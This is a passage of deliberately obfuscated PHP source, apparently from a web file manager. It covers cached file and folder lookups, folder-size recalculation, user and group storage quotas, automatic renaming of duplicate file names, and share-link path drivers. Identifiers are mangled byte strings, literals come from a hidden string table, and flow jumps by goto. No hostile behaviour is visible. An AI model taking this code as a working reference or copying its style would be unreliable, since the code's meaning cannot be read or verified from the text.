self::$cacheFileInfo[$×Ñë¤¾ò] = $ğ¦™Ì£; return $ğ¦™Ì£; } private function folderChildrenNumber($Ğ…é³â„) { $¯Ë¥ÎÄÀ =& $_SERVER[ĞÆÏ¡Îª]; $¤Ÿøö¨É = $this->sourceInfo($Ğ…é³â„); $Úı¼Ï†‘ = array($¯Ë¥ÎÄÀ[599] => array($¯Ë¥ÎÄÀ[559], $¤Ÿøö¨É[$¯Ë¥ÎÄÀ[530]] . $Ğ…é³â„ . $¯Ë¥ÎÄÀ[560]), $¯Ë¥ÎÄÀ[596] => $¤Ÿøö¨É[$¯Ë¥ÎÄÀ[514]], $¯Ë¥ÎÄÀ[439] => intval($¤Ÿøö¨É[$¯Ë¥ÎÄÀ[440]]), $¯Ë¥ÎÄÀ[592] => 1); $Ë»éõ¥Ò = $this->where($Úı¼Ï†‘)->count(); $¼€ùÉØÏ = $this->where($Úı¼Ï†‘)->where(array($¯Ë¥ÎÄÀ[592] => 0))->count(); return array($¯Ë¥ÎÄÀ[80] => $¼€ùÉØÏ, $¯Ë¥ÎÄÀ[81] => $Ë»éõ¥Ò); } public function pathInfo($¹°¥ƒ‘ü, $ƒÇ£ „Û = false) { $¨€†ëª‘ =& $_SERVER[ĞÆÏ¡Îª]; $ƒÇ£ „Û = !1; $¹°¥ƒ‘ü = intval($¹°¥ƒ‘ü); $¡ä”© = $¨€†ëª‘[470] . intval($ƒÇ£ „Û) . $¨€†ëª‘[394] . $¹°¥ƒ‘ü; $»ĞËˆ‹¢ = _get(self::$cachePathInfo, $¡ä”©); if ($»ĞËˆ‹¢) { return $»ĞËˆ‹¢; } $±‡¾•Ø¬ = $this->sourceInfo($¹°¥ƒ‘ü); if (!$±‡¾•Ø¬) { return !1; } $±‡¾•Ø¬ = $this->_listDataApplyItem($±‡¾•Ø¬, $ƒÇ£ „Û); self::$cachePathInfo[$¡ä”©] = $±‡¾•Ø¬; return $±‡¾•Ø¬; } public static $cachePathInfoMore = array(); public function pathInfoMore($®¼¦çè) { $ÄñœÜÂÖ =& $_SERVER[ĞÆÏ¡Îª]; $ğ‡¢ØÂ = _get(self::$cachePathInfoMore, $®¼¦çè); if ($ğ‡¢ØÂ) { return $ğ‡¢ØÂ; } $—›ñÜ²Ü = $this->pathInfo($®¼¦çè); if (!$—›ñÜ²Ü) { return !1; } if ($—›ñÜ²Ü[$ÄñœÜÂÖ[419]] == $ÄñœÜÂÖ[88]) { $—›ñÜ²Ü[$ÄñœÜÂÖ[79]] = $this->folderChildrenNumber($®¼¦çè); } self::$cachePathInfoMore[$®¼¦çè] = $—›ñÜ²Ü; return $—›ñÜ²Ü; } public function sourceInfo($Âû´±ä) { $ÜŞ°¡òë =& $_SERVER[ĞÆÏ¡Îª]; if (!$Âû´±ä) { return array(); } $Âû´±ä = intval($Âû´±ä); $î’–Ğªª = $ÜŞ°¡òë[469] . $Âû´±ä; $¡»Ş”ı‰ = _get(self::$cacheSourceInfo, $î’–Ğªª); if ($¡»Ş”ı‰) { return $¡»Ş”ı‰; } $ĞœéÚâ = $this->where(array($ÜŞ°¡òë[411] => $Âû´±ä))->find(); self::$cacheSourceInfo[$î’–Ğªª] = $ĞœéÚâ; return self::$cacheSourceInfo[$î’–Ğªª]; } public function sourceCacheClear($ÙšîøÃŠ = false) { self::cacheClear($ÙšîøÃŠ); } public static function cacheClear($†‚Ÿ£Ş = false) { $©¹”‚½• =& $_SERVER[ĞÆÏ¡Îª]; if ($†‚Ÿ£Ş == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$©¹”‚½•[469] . $†‚Ÿ£Ş]); unset(self::$cachePathInfoMore[$†‚Ÿ£Ş]); unset(self::$cachePathInfo[$©¹”‚½•[2116] . $†‚Ÿ£Ş]); unset(self::$cachePathInfo[$©¹”‚½•[2117] . $†‚Ÿ£Ş]); } public function metaSet($Ğù‘˜, $Î˜¤İÉ = null, $Ã˜Šø» = null) { $Æ«–Â— = parent::metaSet($Ğù‘˜, $Î˜¤İÉ, $Ã˜Šø»); if ($Æ«–Â—) { $this->sourceCacheClear($Ğù‘˜); } return $Æ«–Â—; } public function pathInfoByPath($¾÷æÈ·é, $‹Ñ×„) { $ïˆøõª‰ =& $_SERVER[ĞÆÏ¡Îª]; $„ùã¸Ò¨ = !$‹Ñ×„ ? array() : explode($ïˆøõª‰[8], trim($‹Ñ×„, $ïˆøõª‰[8])); $ôâÌ¾ã› = $¾÷æÈ·é; foreach ($„ùã¸Ò¨ as $¾ºñ¬) { $å÷„Åø¡ = array($ïˆøõª‰[441] => $ôâÌ¾ã›, $ïˆøõª‰[32] => $¾ºñ¬); $ŒÕªòó = $this->where($å÷„Åø¡)->select(); if (!$ŒÕªòó) { return !1; } $ŒÕªòó = array_sort_by($ŒÕªòó, $ïˆøõª‰[440]); $ôâÌ¾ã› = $ŒÕªòó[0][$ïˆøõª‰[411]]; } return $this->pathInfo($ôâÌ¾ã›, !0); } protected function updateModifyTime($È¬‰òÎú) { $ë£ÊŸÙƒ =& $_SERVER[ĞÆÏ¡Îª]; $É›ıÌÑ = defined($ë£ÊŸÙƒ[484]) ? USER_ID : $ë£ÊŸÙƒ[197]; if (!$È¬‰òÎú) { return; } if (!is_array($È¬‰òÎú)) { $È¬‰òÎú = array($È¬‰òÎú); } foreach ($È¬‰òÎú as $âùÙ»Ì => $“”ŠªÎ²) { $È¬‰òÎú[$âùÙ»Ì] = intval($“”ŠªÎ²); $this->sourceCacheClear($“”ŠªÎ²); } $”»­ğÎ = array($ë£ÊŸÙƒ[411] => array($ë£ÊŸÙƒ[7], $È¬‰òÎú)); $æ½ã€“¬ = array($ë£ÊŸÙƒ[598] => $É›ıÌÑ, $ë£ÊŸÙƒ[433] => time()); $this->where($”»­ğÎ)->save($æ½ã€“¬); } public function folderSizeReset($×«†Ü¼, $¤®³Á = false) { $çÃêõŞÃ =& $_SERVER[ĞÆÏ¡Îª]; if ($this->statusIgnoreResetSpace) { return; } $‰§Şüå€ = $this->sourceInfo($×«†Ü¼); $ØÚ¶ŸÓ† = $çÃêõŞÃ[2118] . $×«†Ü¼; CacheLock::lock($ØÚ¶ŸÓ†, 20); if ($¤®³Á === !1) { $this->sourceCacheClear($×«†Ü¼); $‰§Şüå€ = $this->sourceInfo($×«†Ü¼); $Ú†öà’¬ = array($çÃêõŞÃ[410] => $×«†Ü¼, $çÃêõŞÃ[439] => 0); $·ñúÔ¡Ø = $this->where($Ú†öà’¬)->sum($çÃêõŞÃ[76]); $¤®³Á = intval($·ñúÔ¡Ø) - intval($‰§Şüå€[$çÃêõŞÃ[76]]); } if ($¤®³Á == 0) { return CacheLock::unlock($ØÚ¶ŸÓ†); } $¹ù£³ = $this->parentLevelArray($‰§Şüå€[$çÃêõŞÃ[530]]); if (!$¹ù£³) { $¹ù£³ = array(); } $¹ù£³[] = $‰§Şüå€[$çÃêõŞÃ[411]]; $Ú†öà’¬ = array($çÃêõŞÃ[411] => array($çÃêõŞÃ[427], $¹ù£³)); if ($¤®³Á < 0) { $Ú†öà’¬[$çÃêõŞÃ[76]] = array($çÃêõŞÃ[1006], abs($¤®³Á)); } $this->where($Ú†öà’¬)->setAdd($çÃêõŞÃ[76], $¤®³Á); CacheLock::unlock($ØÚ¶ŸÓ†); $²®ªŠÂä = $çÃêõŞÃ[2119] . $‰§Şüå€[$çÃêõŞÃ[420]] . $çÃêõŞÃ[4] . $‰§Şüå€[$çÃêõŞÃ[514]]; $âüÎÜ×í = array($‰§Şüå€[$çÃêõŞÃ[420]], $‰§Şüå€[$çÃêõŞÃ[514]]); TaskRun::timeLimitCall($²®ªŠÂä, $çÃêõŞÃ[2120], $âüÎÜ×í, 1.5); } public function folderSizeResetChildren($õ»şİ§°) { $ÈáÓÅ™ù =& $_SERVER[ĞÆÏ¡Îª]; $this->sourceCacheClear($õ»şİ§°); $ÚÛçÕ…¨ = $this->sourceInfo($õ»şİ§°); $åˆ¨«Ü÷ = array($ÈáÓÅ™ù[592] => 1, $ÈáÓÅ™ù[596] => $ÚÛçÕ…¨[$ÈáÓÅ™ù[514]], $ÈáÓÅ™ù[599] => array($ÈáÓÅ™ù[559], $ÚÛçÕ…¨[$ÈáÓÅ™ù[530]] . $õ»şİ§° . $ÈáÓÅ™ù[560])); $è™î®Ø© = $ÈáÓÅ™ù[2121]; $ò¸Ä¸”± = $this->field($è™î®Ø©)->where($åˆ¨«Ü÷)->select(); $åˆ¨«Ü÷[$ÈáÓÅ™ù[419]] = 0; $Ÿ‰®úğ = $this->field($è™î®Ø©)->where($åˆ¨«Ü÷)->select(); if (!$Ÿ‰®úğ) { return; } $ò¸Ä¸”±[] = $ÚÛçÕ…¨; $ò¸Ä¸”± = array_to_keyvalue($ò¸Ä¸”±, $ÈáÓÅ™ù[411]); foreach ($ò¸Ä¸”± as $ƒµ‘¥ğ£ => $ô›¾íü) { $ò¸Ä¸”±[$ƒµ‘¥ğ£][$ÈáÓÅ™ù[2122]] = $ò¸Ä¸”±[$ƒµ‘¥ğ£][$ÈáÓÅ™ù[76]]; $ò¸Ä¸”±[$ƒµ‘¥ğ£][$ÈáÓÅ™ù[76]] = 0; } foreach ($Ÿ‰®úğ as $ô›¾íü) { $›†üÉîß = $ô›¾íü[$ÈáÓÅ™ù[441]] . $ÈáÓÅ™ù[12]; if (!isset($ò¸Ä¸”±[$›†üÉîß])) { continue; } if ($ô›¾íü[$ÈáÓÅ™ù[440]] == $ò¸Ä¸”±[$›†üÉîß][$ÈáÓÅ™ù[440]]) { $ò¸Ä¸”±[$›†üÉîß][$ÈáÓÅ™ù[76]] += $ô›¾íü[$ÈáÓÅ™ù[76]]; } } foreach ($ò¸Ä¸”± as $ô›¾íü) { $†œÕö‘­ = $this->parentLevelArray($ô›¾íü[$ÈáÓÅ™ù[530]]); foreach ($†œÕö‘­ as $›†üÉîß) { $›†üÉîß = $›†üÉîß . $ÈáÓÅ™ù[12]; if (!isset($ò¸Ä¸”±[$›†üÉîß])) { continue; } if ($ô›¾íü[$ÈáÓÅ™ù[440]] == $ò¸Ä¸”±[$›†üÉîß][$ÈáÓÅ™ù[440]]) { $ò¸Ä¸”±[$›†üÉîß][$ÈáÓÅ™ù[76]] += $ô›¾íü[$ÈáÓÅ™ù[76]]; } } } $ààßğÆ = array(); foreach ($ò¸Ä¸”± as $ô›¾íü) { if ($ô›¾íü[$ÈáÓÅ™ù[76]] == $ô›¾íü[$ÈáÓÅ™ù[2122]]) { continue; } $ààßğÆ[] = array($ÈáÓÅ™ù[411], $ô›¾íü[$ÈáÓÅ™ù[411]], $ÈáÓÅ™ù[76], $ô›¾íü[$ÈáÓÅ™ù[76]]); } $this->saveAll($ààßğÆ); } public function userSpaceReset($ÎÏ©³¨È = false) { $¤ññå£ú =& $_SERVER[ĞÆÏ¡Îª]; $²ô°Àã¿ = $this->where(array($¤ññå£ú[420] => self::TYPE_USER, $¤ññå£ú[514] => $ÎÏ©³¨È, $¤ññå£ú[419] => 0))->sum($¤ññå£ú[76]); $²ô°Àã¿ = !$²ô°Àã¿ || $²ô°Àã¿ <= 0 ? 0 : $²ô°Àã¿; Model($¤ññå£ú[522])->userEdit($ÎÏ©³¨È, array($¤ññå£ú[1808] => $²ô°Àã¿)); } public function targetSpaceUpdate($…¯÷ê°Ğ, $æ€£Ë€ù) { $ªÚÈã =& $_SERVER[ĞÆÏ¡Îª]; if (!$æ€£Ë€ù) { return; } if (!in_array($…¯÷ê°Ğ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $©èŠ®Ï = $this->targetSpaceSize($…¯÷ê°Ğ, $æ€£Ë€ù); if ($…¯÷ê°Ğ == self::TYPE_USER) { Model($ªÚÈã[522])->userEdit($æ€£Ë€ù, array($ªÚÈã[1808] => $©èŠ®Ï)); } else { if ($…¯÷ê°Ğ == self::TYPE_GROUP) { Model($ªÚÈã[531])->groupEdit($æ€£Ë€ù, array($ªÚÈã[1808] => $©èŠ®Ï)); } } } public function targetSpaceSize($’‘Üœ÷‹, $Áø¾¤Ï) { $½ÄÌòÙà =& $_SERVER[ĞÆÏ¡Îª]; $„÷·÷¥è = 0; $ÜîšœÙ½ = $this->sourceRoot($’‘Üœ÷‹, $Áø¾¤Ï, !0); foreach ($ÜîšœÙ½ as $áôş¯±) { if (!$áôş¯±) { continue; } $„÷·÷¥è += floatval($áôş¯±[$½ÄÌòÙà[76]]); $Ï½òñ“ = array($½ÄÌòÙà[599] => array($½ÄÌòÙà[559], $½ÄÌòÙà[540] . $áôş¯±[$½ÄÌòÙà[411]] . $½ÄÌòÙà[560])); $‡¶Ïü£ = Model($½ÄÌòÙà[438])->field($½ÄÌòÙà[426])->where($Ï½òñ“)->select(); $‡¶Ïü£ = array_to_keyvalue($‡¶Ïü£, $½ÄÌòÙà[12], $½ÄÌòÙà[411]); $‡¶Ïü£ = array_unique(array_filter($‡¶Ïü£)); if ($‡¶Ïü£) { $Ï½òñ“ = array($½ÄÌòÙà[426] => array($½ÄÌòÙà[427], $‡¶Ïü£)); $„÷·÷¥è += floatval($this->where($Ï½òñ“)->sum($½ÄÌòÙà[76])); } } $„÷·÷¥è = !$„÷·÷¥è || $„÷·÷¥è <= 0 ? 0 : $„÷·÷¥è; return $„÷·÷¥è; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Á±Ó™¯®) { return $this->fileTypeProfile($Á±Ó™¯®, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ö±Ûô×…) { return $this->fileTypeProfile($ö±Ûô×…, SourceModel::TYPE_GROUP); } private function fileTypeProfile($°âü¤Ñ, $Ì§íÕÃë) { $–¬÷‡ûü =& $_SERVER[ĞÆÏ¡Îª]; $ÓÚ®Ÿ‘¬ = $–¬÷‡ûü[2123] . $°âü¤Ñ . $–¬÷‡ûü[11] . $Ì§íÕÃë; $”Ö«…¾â = Cache::get($ÓÚ®Ÿ‘¬); if ($”Ö«…¾â) { return $”Ö«…¾â; } $à˜ş—Œ = array($–¬÷‡ûü[592] => 0); if ($°âü¤Ñ != !1) { $à˜ş—Œ[$–¬÷‡ûü[514]] = $°âü¤Ñ; $à˜ş—Œ[$–¬÷‡ûü[420]] = $Ì§íÕÃë; } $òÏäÃÊµ = array(); $òÏäÃÊµ[$–¬÷‡ûü[2124]] = array($–¬÷‡ûü[2125] => LNG($–¬÷‡ûü[2124]), $–¬÷‡ûü[2126] => $this->where($à˜ş—Œ)->count(), $–¬÷‡ûü[594] => $this->where($à˜ş—Œ)->sum($–¬÷‡ûü[76])); $çêÊÎÍÜ = KodIO::fileTypeList(); foreach ($çêÊÎÍÜ as $™ÇËˆîü => $€¥¶°üÓ) { $à˜ş—Œ[$–¬÷‡ûü[421]] = $this->fileTypeWhere($™ÇËˆîü); $òÏäÃÊµ[$™ÇËˆîü] = array($–¬÷‡ûü[2125] => $€¥¶°üÓ[$–¬÷‡ûü[32]], $–¬÷‡ûü[2126] => $this->where($à˜ş—Œ)->count(), $–¬÷‡ûü[594] => $this->where($à˜ş—Œ)->sum($–¬÷‡ûü[76])); } Cache::set($ÓÚ®Ÿ‘¬, $òÏäÃÊµ, 1200); return $òÏäÃÊµ; } public function fileNameExist($€¢øÆ‹ı, $Á­ƒïí¯) { $Ã‹¦”ö» =& $_SERVER[ĞÆÏ¡Îª]; $å‰ áõ’ = $this->where(array($Ã‹¦”ö»[441] => $€¢øÆ‹ı, $Ã‹¦”ö»[32] => $Á­ƒïí¯, $Ã‹¦”ö»[440] => 0))->find(); return is_array($å‰ áõ’) ? $å‰ áõ’[$Ã‹¦”ö»[411]] : !1; } public function childList($€Ú£˜û) { $µ–èò‰ =& $_SERVER[ĞÆÏ¡Îª]; $ˆº‘Ò­› = $µ–èò‰[2101] . $€Ú£˜û; if (isset(self::$cacheChildList[$ˆº‘Ò­›])) { return self::$cacheChildList[$ˆº‘Ò­›]; } $°æèßôœ = array($µ–èò‰[441] => intval($€Ú£˜û), $µ–èò‰[440] => 0); $”²ªËĞ = $this->where($°æèßôœ)->select(); $”²ªËĞ = $”²ªËĞ ? $”²ªËĞ : array(); self::$cacheChildList[$ˆº‘Ò­›] = $”²ªËĞ; foreach ($”²ªËĞ as $“”÷…è¢) { $ˆº‘Ò­› = $µ–èò‰[469] . $“”÷…è¢[$µ–èò‰[411]]; self::$cacheSourceInfo[$ˆº‘Ò­›] = $“”÷…è¢; } return $”²ªËĞ; } public function fileNameAuto($Şï£é¼Â, $ğÚ³º‚Ë, $èíãò©® = REPEAT_RENAME, $‹ËÈß¡ş = false) { $„“ÙÑĞ =& $_SERVER[ĞÆÏ¡Îª]; $ş«ÉüäŞ = get_path_ext($ğÚ³º‚Ë); $„ºïèÂ = $ş«ÉüäŞ ? basename($ğÚ³º‚Ë, $„“ÙÑĞ[10] . $ş«ÉüäŞ) . $„“ÙÑĞ[2127] . $ş«ÉüäŞ : $ğÚ³º‚Ë . $„“ÙÑĞ[392]; $øÒ¼ı’à = array($„“ÙÑĞ[441] => $Şï£é¼Â, $„“ÙÑĞ[440] => 0, $„“ÙÑĞ[32] => array($„“ÙÑĞ[391], $„ºïèÂ)); $Û§ıÈÒ¨ = $this->field($„“ÙÑĞ[32])->where($øÒ¼ı’à)->select(); $¼‹üù = array_to_keyvalue($Û§ıÈÒ¨, $„“ÙÑĞ[12], $„“ÙÑĞ[32]); return $this->fileNameAutoGet($¼‹üù, $ğÚ³º‚Ë, $èíãò©®, $‹ËÈß¡ş); } public function fileNameAutoGet($ŒÒøşâæ, $Ë†İşª—, $Èíå”Æ‚, $µö¾úÎ‰) { $¡¶“Î­ =& $_SERVER[ĞÆÏ¡Îª]; if ($Èíå”Æ‚ == REPEAT_REPLACE || !$ŒÒøşâæ || !in_array_not_case($Ë†İşª—, $ŒÒøşâæ) || $µö¾úÎ‰ && $Èíå”Æ‚ != REPEAT_RENAME_FOLDER) { return $Ë†İşª—; } if ($Èíå”Æ‚ == REPEAT_SKIP) { return !1; } $£Á¡Æ€Ñ = $¡¶“Î­[10] . get_path_ext($Ë†İşª—); $£Á¡Æ€Ñ = $£Á¡Æ€Ñ == $¡¶“Î­[10] || $µö¾úÎ‰ ? $¡¶“Î­[12] : $£Á¡Æ€Ñ; for ($âéå£•Ë = 1; $âéå£•Ë <= count($ŒÒøşâæ) + 1; $âéå£•Ë++) { $ÏÏûÇ°Ò = substr($Ë†İşª—, 0, strlen($Ë†İşª—) - strlen($£Á¡Æ€Ñ)); $ã†â±œ = $ÏÏûÇ°Ò . "\50{$âéå£•Ë}\x29{$£Á¡Æ€Ñ}"; if (!in_array_not_case($ã†â±œ, $ŒÒøşâæ)) { return $ã†â±œ; } } } } goto d»­›Ë—; BŒ—¢Í…Æ‹: class PathDriverDriverShareItem { public function __construct($Ş¶») { $this->pathParse = $Ş¶»; } public function __call($Š¹ÎÓ¤¹, $œï¾µ•İ) { $ø‘ÉÏ÷Ì =& $_SERVER[ĞÆÏ¡Îª]; if (method_exists($this, $Š¹ÎÓ¤¹)) { return; } $¾¬ñªÉ = call_user_func_array(array($ø‘ÉÏ÷Ì[1328], $Š¹ÎÓ¤¹), $œï¾µ•İ); $ÇÎÛ½× = array($ø‘ÉÏ÷Ì[1329], $ø‘ÉÏ÷Ì[1330], $ø‘ÉÏ÷Ì[1331], $ø‘ÉÏ÷Ì[1332], $ø‘ÉÏ÷Ì[564], $ø‘ÉÏ÷Ì[566], $ø‘ÉÏ÷Ì[1333], $ø‘ÉÏ÷Ì[107], $ø‘ÉÏ÷Ì[1334], $ø‘ÉÏ÷Ì[1335]); if (in_array($Š¹ÎÓ¤¹, $ÇÎÛ½×)) { $¾¬ñªÉ = $this->getPathOuter($¾¬ñªÉ); } return $¾¬ñªÉ; } public function copy($ñêÂíé†, $†Ü£¹Ëæ, $ÁŞ‘§ôŸ = false, $³Îàß = false) { return $this->copyMove($ñêÂíé†, $†Ü£¹Ëæ, $ÁŞ‘§ôŸ, $_SERVER[ĞÆÏ¡Îª][564], $³Îàß); } public function move($ŸÔ¬¾Š¡, $¾ø­éî¹, $ö°‡´Ÿ° = false, $­ñç§â  = false) { return $this->copyMove($ŸÔ¬¾Š¡, $¾ø­éî¹, $ö°‡´Ÿ°, $_SERVER[ĞÆÏ¡Îª][566], $­ñç§â ); } private function copyMove($âš‘²ê¹, $®¼ÅÇÎê, $§¨à¼ë, $àÆ±…, $¶í‘Ñ§ = false) { $éˆó•üÜ =& $_SERVER[ĞÆÏ¡Îª]; $ÔŒ¤Àé¬ = $®¼ÅÇÎê; $­”±È‘¬ = IO::driverMake($®¼ÅÇÎê); if ($­”±È‘¬->pathParse[$éˆó•üÜ[1142]]) { $®¼ÅÇÎê = $­”±È‘¬->pathParse[$éˆó•üÜ[1142]]; } else { $®¼ÅÇÎê = $ÔŒ¤Àé¬; } $…üãÌ•€ = IO::copyMove($âš‘²ê¹, $®¼ÅÇÎê, $§¨à¼ë, $àÆ±…, $¶í‘Ñ§); $…üãÌ•€ = $this->getPathOuter($…üãÌ•€); return $…üãÌ•€; } public function pathThis($ÜÇš—èç) { return get_path_this($this->pathParse[$_SERVER[ĞÆÏ¡Îª][84]]); } public function pathFather($–ïÆÄ©Œ) { return get_path_father($this->pathParse[$_SERVER[ĞÆÏ¡Îª][84]]); } public function iconvSystem($ĞÎçæïã) { return $ĞÎçæïã; } protected function infoParse($ıŒƒè, $Áçó° = false) { $Ã»ŸòÙ =& $_SERVER[ĞÆÏ¡Îª]; $îÖõºãİ = $this->pathParse[$Ã»ŸòÙ[496]][$Ã»ŸòÙ[1167]] . $this->pathParse[$Ã»ŸòÙ[1160]]; if ($Áçó°) { $Ì±Éš–° = IO::infoWithChildren($îÖõºãİ); } else { $Ì±Éš–° = IO::info($îÖõºãİ); } $›ÕûŸÎÀ = $this->pathParse[$Ã»ŸòÙ[496]]; return Action($Ã»ŸòÙ[1326])->_shareItemeParse($Ì±Éš–°, $›ÕûŸÎÀ); } public function listAll($š½Şò) { $±ş®û¼£ =& $_SERVER[ĞÆÏ¡Îª]; $ìª˜³ä = IO::listAll($š½Şò); $òıñ´…£ = $this->pathParse[$±ş®û¼£[496]]; foreach ($ìª˜³ä as &$Àº‹ù¦¡) { check_abort(); $ÅÊĞÏóú = IO::info($Àº‹ù¦¡[$±ş®û¼£[84]]); $ÅÊĞÏóú = is_array($ÅÊĞÏóú) ? $ÅÊĞÏóú : array(); $Àº‹ù¦¡ = array_merge($ÅÊĞÏóú, $Àº‹ù¦¡); $Àº‹ù¦¡[$±ş®û¼£[86]] = Action($±ş®û¼£[1326])->_shareItemeParse($Àº‹ù¦¡, $òıñ´…£); } unset($Àº‹ù¦¡); return $ìª˜³ä; } public function getPathOuter($ø¢–—™÷) { $Ú„Åƒ¶Æ =& $_SERVER[ĞÆÏ¡Îª]; $È±Íï¢¯ = KodIO::parse($ø¢–—™÷); if ($È±Íï¢¯[$Ú„Åƒ¶Æ[33]] == KodIO::KOD_SHARE_ITEM) { return $È±Íï¢¯[$Ú„Åƒ¶Æ[84]]; } $êúÛñä = KodIO::clear($ø¢–—™÷); $’‡·¸Ãê = KodIO::clear($this->pathParse[$Ú„Åƒ¶Æ[496]][$Ú„Åƒ¶Æ[1167]]); $İô•ä»§ = substr($êúÛñä, strlen($’‡·¸Ãê)); if (substr($êúÛñä, 0, strlen($’‡·¸Ãê)) != $’‡·¸Ãê) { return !1; } return $this->pathParse[$Ú„Åƒ¶Æ[1161]] . $Ú„Åƒ¶Æ[8] . ltrim($İô•ä»§, $Ú„Åƒ¶Æ[8]); } public function getType() { $Äµ¦ö¢ =& $_SERVER[ĞÆÏ¡Îª]; $¿ıßù¾³ = str_replace($Äµ¦ö¢[74], $Äµ¦ö¢[12], get_class($this)); return strtolower($¿ıßù¾³); } public function isTypeObject($©‹ß²Šµ) { return IO::isTypeObject($©‹ß²Šµ); } public function info($ş¾“Öß) { return $this->infoParse($ş¾“Öß); } public function infoAuth($¶ÆÙÁ¾) { return $this->infoParse($¶ÆÙÁ¾); } public function infoWithChildren($üÃ©¹) { return $this->infoParse($üÃ©¹, !0); } public function infoFull($£Œ¦ò¦) { return $this->infoParse($£Œ¦ò¦); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ıÒô²¸…) { $this->pathParse = $ıÒô²¸…; } protected function infoParse($áÀîç´Ô, $‚•şâÑæ = false) { $®œ–æÇÍ =& $_SERVER[ĞÆÏ¡Îª]; return Action($®œ–æÇÍ[1166])->sharePathInfo($this->pathParse[$®œ–æÇÍ[84]], !0, $‚•şâÑæ); } public function listPath($“…²±¹½, $¶Ê¨¸ä = false) { $¸²ï”³æ =& $_SERVER[ĞÆÏ¡Îª]; $¢™”ÛĞü = IO::listPath($“…²±¹½, $¶Ê¨¸ä); if (!$¢™”ÛĞü) { return $¢™”ÛĞü; } if (is_array($¢™”ÛĞü[$¸²ï”³æ[1327]])) { $Ù‰¶µØâ = Action($¸²ï”³æ[1336])->parsePathChildren($¢™”ÛĞü[$¸²ï”³æ[1327]], array($¸²ï”³æ[430] => $“…²±¹½)); $¢™”ÛĞü[$¸²ï”³æ[1327]] = Action($¸²ï”³æ[1166])->shareItemInfo($Ù‰¶µØâ); } foreach ($¢™”ÛĞü as $şÑÉ¬€ => $ôõÏ÷¿—) { if (!in_array($şÑÉ¬€, array($¸²ï”³æ[83], $¸²ï”³æ[82]))) { continue; } foreach ($ôõÏ÷¿— as $úúúÃßâ => $Ù‰¶µØâ) { $Ù‰¶µØâ = Action($¸²ï”³æ[1336])->parsePathChildren($Ù‰¶µØâ, array($¸²ï”³æ[430] => $“…²±¹½)); $¢™”ÛĞü[$şÑÉ¬€][$úúúÃßâ] = Action($¸²ï”³æ[1166])->shareItemInfo($Ù‰¶µØâ); } } return $¢™”ÛĞü; } public function listAll($£˜ìøêŠ) { $±–è„“ô =& $_SERVER[ĞÆÏ¡Îª]; $Úæ“¶å¼ = IO::listAll($£˜ìøêŠ); foreach ($Úæ“¶å¼ as &$ß£ıúø) { $¶‘Àæß÷ = IO::info($ß£ıúø[$±–è„“ô[84]]); $¶‘Àæß÷ = is_array($¶‘Àæß÷) ? $¶‘Àæß÷ : array(); $ß£ıúø = array_merge($¶‘Àæß÷, $ß£ıúø); $ß£ıúø[$±–è„“ô[86]] = Action($±–è„“ô[1166])->shareItemInfo($ß£ıúø); } unset($ß£ıúø); return $Úæ“¶å¼; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($¼î«ÁŒÈ) { parent::__construct($¼î«ÁŒÈ); } } goto e®µË¢®ô”; a‰Ó˜‘ñƒÂ: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\x54\x69\155\145", "\164\x69\155\145", "\151\x6e\163\x65\x72\164\54\165\160\x64\141\x74\x65", "\x66\x75\x6e\143\x74\x69\157\x6e"), array("\143\x72\145\x61\x74\145\x54\151\x6d\145", "\x74\x69\x6d\145", "\151\x6e\x73\x65\x72\x74", "\146\x75\x6e\x63\164\x69\157\156"), array("\157\160\x74\151\x6f\x6e\x73", '', "\151\x6e\x73\145\162\x74\54\165\160\x64\141\164\145\x2c\163\145\154\x65\x63\x74", "\x6a\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Œ«‰ÉœŠ) { $†ãÖŸ» =& $_SERVER[ĞÆÏ¡Îª]; $üöÌƒ†¼ = isset($Œ«‰ÉœŠ[0]) ? $Œ«‰ÉœŠ[0] : !1; return array($†ãÖŸ»[1958] => array(USER_ID, $†ãÖŸ»[1959]), $†ãÖŸ»[1899] => array($üöÌƒ†¼, $†ãÖŸ»[1960])); } protected function listSimple() { $òîÊØù = array($_SERVER[ĞÆÏ¡Îª][1647] => USER_ID); $´íºğŠ¾ = $this->field($this->fieldList)->where($òîÊØù)->select(); return $´íºğŠ¾ ? $´íºğŠ¾ : array(); } protected function getInfo($±¦é£œñ, $â„¨ ú = false) { $íµ¼×¿ö =& $_SERVER[ĞÆÏ¡Îª]; if ($â„¨ ú) { return $this->_getShareInfo(array($íµ¼×¿ö[498] => $±¦é£œñ)); } $±ú¬üÍ– = $this->cacheFunctionGet($íµ¼×¿ö[1901], $±¦é£œñ); return $±ú¬üÍ–; } public function getInfoByHash($º¹á²¿) { return $this->_getShareInfo(array($_SERVER[ĞÆÏ¡Îª][500] => $º¹á²¿)); } public function getInfoByPath($Šù­™íµ) { $½õÂÎìâ =& $_SERVER[ĞÆÏ¡Îª]; $öìÙº¨Å = array($½õÂÎìâ[1647] => USER_ID, $½õÂÎìâ[411] => $Šù­™íµ); return $this->_getShareInfo($öìÙº¨Å); } public function getInfoBySourcePath($øÓÀá§) { $¿äöÄĞ =& $_SERVER[ĞÆÏ¡Îª]; $ó¹âüˆ = array($¿äöÄĞ[1647] => USER_ID, $¿äöÄĞ[1167] => $øÓÀá§); return $this->_getShareInfo($ó¹âüˆ); } private function _getShareInfo($ÜÊíé³¨) { $â²©êÁş =& $_SERVER[ĞÆÏ¡Îª]; $½·ÊÈœÍ = $this->where($ÜÊíé³¨)->find(); if (!$½·ÊÈœÍ) { return !1; } $ÜÊíé³¨ = array($â²©êÁş[498] => $½·ÊÈœÍ[$â²©êÁş[498]]); $ç‹ğ® = $â²©êÁş[1961]; $¦®›©¥³ = Model($â²©êÁş[611])->order($â²©êÁş[407])->field($ç‹ğ®)->where($ÜÊíé³¨)->select(); if ($½·ÊÈœÍ[$â²©êÁş[411]] == $â²©êÁş[197]) { $½·ÊÈœÍ[$â²©êÁş[86]] = IO::info($½·ÊÈœÍ[$â²©êÁş[1167]]); 